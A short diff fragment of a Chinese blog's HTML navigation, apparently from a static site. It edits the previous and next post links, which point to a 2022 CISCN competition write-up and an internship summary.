-      <a href="/2022/08/13/2022%20CISCN%20%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B%E5%88%9D%E8%B5%9BWP/" title="2022 CISCN 创新能力实践赛初赛WP"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
-    </li>
     
+    <li class="next">
+      <a href="/2022/08/26/%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93/" title="实习总结"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
     
     
   </ul>
